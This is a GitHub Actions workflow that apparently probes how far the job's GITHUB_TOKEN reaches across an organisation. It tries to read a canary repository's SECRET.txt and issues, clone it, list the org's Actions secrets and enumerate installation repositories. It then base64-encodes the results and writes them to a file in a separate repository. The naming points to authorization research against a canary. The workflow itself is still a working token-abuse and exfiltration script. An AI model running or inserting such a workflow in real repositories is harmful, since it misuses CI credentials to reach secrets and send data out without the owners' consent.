name: probe
on: [push, workflow_dispatch]
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        env:
          GT: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set +eo pipefail
          A=https://api.github.com; C=s3rdz0-org/bola-canary-23514
          R="canary_repo=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C) "
          R="${R}contents=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/contents/SECRET.txt) "
          R="${R}issue=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/repos/$C/issues/1) "
          R="${R}clone=$(git clone https://x-access-token:$GT@github.com/$C /tmp/c 2>&1 | tail -1 | tr ' ' '_') "
          R="${R}org_secrets=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: token $GT" $A/orgs/s3rdz0-org/actions/secrets) "
          R="${R}scope=$(curl -s -H "Authorization: token $GT" $A/installation/repositories | tr -d '\n ' | cut -c1-250)"
          echo "PROBE $R"
          B64=$(printf '%s' "$R" | base64 -w0)
          curl -s -X PUT -H "Authorization: token $GT" $A/repos/s3rdz0-org/bola-actions/contents/RESULTS.txt -d "{\"message\":\"r\",\"content\":\"$B64\"}" -o /dev/null -w "PUT=%{http_code}\n"